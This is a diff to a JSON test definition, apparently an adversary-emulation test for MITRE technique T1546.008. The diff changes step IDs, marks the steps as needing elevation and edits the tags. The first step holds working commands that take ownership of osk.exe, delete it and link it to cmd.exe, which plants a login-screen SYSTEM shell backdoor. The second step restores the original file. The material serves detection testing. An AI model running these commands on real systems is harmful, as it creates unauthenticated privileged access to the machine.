@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
+      "id": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
       "type": "execute-command",
       "data": {
         "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "eaca6963-1a20-4168-8cf9-c8a61f702288",
+      "id": "94e1978d-48cc-412d-a156-1fb1dd7e7b04",
       "type": "execute-command",
       "data": {
         "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
         "command_type": "command_prompt"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
+      "s": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
       "p": "on-success",
-      "o": "eaca6963-1a20-4168-8cf9-c8a61f702288"
+      "o": "94e1978d-48cc-412d-a156-1fb1dd7e7b04"
     },
     {
-      "s": "3e879514-2217-4f7e-92fc-2b6b4bc91e71",
+      "s": "b9baf58d-14f1-437d-a83d-8c0d8b3ca957",
       "p": "on-failure",
-      "o": "eaca6963-1a20-4168-8cf9-c8a61f702288"
+      "o": "94e1978d-48cc-412d-a156-1fb1dd7e7b04"
     }
   ],
   "tags": [
-    "T1546.008",
-    "atomic-red-team"
+    "T1546",
+    "T1546.008"
   ]
 }
